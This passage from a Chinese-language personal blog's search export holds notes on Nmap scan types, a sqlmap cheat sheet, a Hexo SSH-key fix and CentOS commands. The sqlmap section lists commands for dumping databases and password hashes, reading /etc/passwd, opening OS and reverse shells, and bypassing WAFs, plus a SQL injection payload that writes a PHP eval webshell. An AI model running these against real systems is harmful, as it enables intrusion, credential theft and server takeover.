是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 –scanflags ：实现上同上面几种类似，可以让用户自定义TCP标志位。 -sI : Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1. -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 端口相关参数 -p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports : 排除端口 -F：扫描比缺省少的端口（缺省1000，加了-F100） -r：顺序扫描端口，缺省是随机分组扫描 –top-ports :按top排序扫描知名端口 –port-ratio : 按比例扫描知名端口，值在0-1之间，越小扫的越多 系统/版本探测 -sV:探测开放的端口的系统/服务信息 –version-intensity :设置版本检测的详程度级别，0-9，越高越详细 –version-light：输出最可能的版本信息，缺省是2 –version-all：使用所有的探测条件进行版本/系统探测 –version-trace:打印详细的版本扫描过程 脚本扫描 –script=:指定脚本名称 –script-args=&lt;n1=v1,[n2=v2,…]&gt;:为脚本指定参数 –script-help=: 查看脚本帮助信息 –script-updatedb:更新脚本数据库 系统探测 -O:激活系统探测 –osscan-limit:只对开放端口的有效主机进行系统探测 –osscan-guess：推测系统信息 其他 -T:时间模板，越大速度越快 -6：使能IPV6探测 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -V：打印版本号 -v：增加输出的详细程度]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap常用参数]]></title>
    <url>%2F%2F2020%2F06%2F519cc.html</url>
    <content type="text"><![CDATA[sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns #列出字段- –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容 –privileges #查看权限 –is-dba #是否是数据库管理员 –roles #枚举数据库用户角色 –udf-inject #导入用户自定义函数（获取系统权限） –union-check #是否支持union 注入 –union-cols #union 查询表记录 –union-test #union 语句测试 –union-use #采用union 注入 –union-tech orderby #union配合order by –method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″) –cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “” #使用referer欺骗(–referer “http://www.baidu.com”) –user-agent “” #自定义user-agent –proxy “http://127.0.0.1:8118″ #代理注入 –string “” #指定关键词 –threads #采用多线程(–threads 3) –sql-shell #执行指定sql命令 –sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ ) –file-read #读取指定文件 –file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) –file-dest #要写入的文件绝对路径 –os-cmd=id #执行系统命令 –os-shell #系统交互shell –os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) –msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/) –os-smbrelay # –os-bof # –reg-read #读取win系统注册表 –priv-esc # –time-sec= #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入 –eta #盲注 1. 基础用法 ./sqlmap.py -u “注入地址” -v 1 –dbs // 列举数据库 ./sqlmap.py -u “注入地址” -v 1 –current-db // 当前数据库 ./sqlmap.py -u “注入地址” -v 1 –users // 列数据库用户 ./sqlmap.py -u “注入地址” -v 1 –current-user // 当前用户 ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库” // 列举数据库的表名 ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库” // 获取表的列名 ./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库” // 获取表中的数据，包含列已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap/output/中 2. sqlmap post注入 在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.2cto.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 如下图，这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 3. sqlmap cookies注入 sqlmap.py -u “http://127.0.0.1/base.php&quot; –cookies “id=1” –dbs –level 2 默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础 上面加上 –level 2 即可利用sqlmap cookies注入突破用户登录继续注入先把用户登陆的cookie拿到吧，在收藏夹添加一个链接cookies属性：名字自己取javascript:alert(document.cookie)，，需要获取当前cookie的时候，直接点一下这个链接，然后复制一下弹出对话框里的cookie值就搞定了sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”-p是指指定参数注入 4. sqlmap遇到url重写的注入 哪里存在注入就加上 号./sqlmap.py -u “http://www.cunlide.com/id1/1/id2/2” 5. sqlmap 编码绕waf注入在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载 ./sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py” sqlmap读文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-read “/etc/passwd” sqlmap写文件 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–file-write /localhost/mm.php –file-dest/var/www/html/xx.php -v 2 sqlmap分段脱裤 sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000其他基础： sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-user #获取当前用户名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql” –current-db #获取当前数据库名称 sqlmap -u “http://www.xxoo.com/news?id=1&quot; –level=3 –smart –dbms “Mysql”–tables -D “db_name” #列表名 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –columns -T “tablename” users-D “db_name” -v 0 #列字段 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart –dbms “Mysql” –dump -C “column_name” -T “table_name” -D “db_name” -v 0 #获取字段内容 信息获取 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –users #列数据库用户 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs#列数据库 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords #数据库用户密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–passwords-U root -v 0 #列出指定用户数据库密码 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges #查看权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–privileges -U root #查看指定用户权限 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –roles #枚举数据库用户角色 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–udf-inject #导入用户自定义函数（获取系统权限！） sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–dump-all –exclude-sysdbs -v 0 #列出当前库所有表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” - –union-check #是否支持union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-cols #union 查询表记录 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-test #union 语句测试 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –union-use –banner #采用union 注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–union-test –union-tech orderby #union 配合 order by sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–method “POST” – data “id=1&amp;cat=2” #post注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–cookie “COOKIE_VALUE” #cookie注入 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”-b #获取banner信息 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart-v 1 -f #指纹判别数据库类型 sqlmap -u “http://url/news?id=1&quot; –level=3 –smart–proxy”http://127.0.0.1:8118&quot; #代理注入 sqlmap -u “http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–sql-shell #执行指定sql命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-shell #系统交互shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–os-pwn #反弹shell sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql”–reg-read #读取win系统注册表 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度 sqlmap -u “http://url/news?id=1&quot;--level=3 –smart –dbms “Mysql” –dbs -o “sqlmap.log” –resume #恢复已保存进度 ./sqlmap.py -u “http://www.91ri.org/ id1/1*/id2/2″“Show.asp” –cookie “id=9” –table –level 2–forms–data “data”–delay 0.5–safe-freq 25-v 3 –dbs –batch –tamper “base64encode.py”sqlmap.py -u url -D “data” -T “tables” -C “username,password,email” –dump-all -v 传统的sql语句写shell通过sql注入select into outfile实现，如： 11&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;# dumpfile、file_put_contents outfile不能用了怎么办？select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;;可以 UDF提权https://www.cnblogs.com/milantgh/p/5444398.html outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。 写shell条件 文件名必须是绝对路径 用户必须有写文件权限 sqlmap写shell前提需要对目录具有写权限 1--os-cmd=&quot;net user&quot; 交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。 1--os-shell 写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell 关闭sqlmap文件就会被删除 常见数据库端口号123456789101112131415Oracle 默认1521SQL Server 默认1433Mysql默认330621 FTP22 ssh23 telnet25 smtp109 110 pop2 pop3]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo日志]]></title>
    <url>%2F%2F2019%2F06%2F1c91193.html</url>
    <content type="text"><![CDATA[2019.6.1Git 远程遇到了问题: Please make sure you have the correct access rights and the repository exists. 发现是ssh key有问题，连接不上服务器 首先是重新在git设置一下身份的名字和邮箱： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;your@email.com&quot; 注：要添加具体的yourname，your@email 删除.ssh文件夹（直接搜索该文件夹）下的known_hosts 在 git输入命令： $ ssh-keygen -t rsa -C &quot;your@email.com&quot; 然后会出现： Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa): 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制 登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key 在 git 中输入命令 ssh -T git@github.com 然后输入Yes回车，就会提示成功 之后就可以正常 hexo d -g 啦]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS]]></title>
    <url>%2F%2F2019%2F05%2F875db5e1.html</url>
    <content type="text"><![CDATA[CentOS 常用命令 shutdown -h now 关机 shutdown -h +3 三分钟后关机 halt poweroff init 0 shutdown -r now 重启 shutdown -r +3 三分钟重启 reboot init 6 cat 1.txt | tail - n +3001 | head -n 1000 截取文件中的3001到4000 grep o 1.txt 正常过滤 grep -v 1.txt 反向过滤 cat &gt;1.txt 清空文件内容 ll -d /data/www 查看权限 pkill -kill -t tty3 杀死用户进程 mkdir /media/cdrom mount /dev/sr0 /media/cdrom 挂载光盘 umount /media/cdrom 卸载 systemctl stop firewalld.service 关闭防火墙 setenforce 0 给外界权限 systemctl disable firewalld.service 永久关闭 systemctl enable firewalld.service 永久开启 vim /etc/rc.d/rc.local 设置开机启动为镜像添加开机自动挂载 echo &quot;mount /dev/sr0 /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local vim /etc/selinux/config ^vim^cat 把vim替换成cat继续执行 ls -al 看临时文件 CentOS7 目录文件 /etc/yum.repos.d/ yum源文件位置 /etc/rc.d/rc.local 开机启动文件 rm -f /var/run/yum.pid yum clean all 清空yum源缓存 /etc/nginx/conf.d/default.conf Nginx配置文件 vim /etc/my.cnf 去mysql密码要求 /usr/share/nginx/html/ Nginx主页文件位置 /etc/httpd/conf/httpd.conf Apache配置文件 /var/www/html/ Apache主页文件位置]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
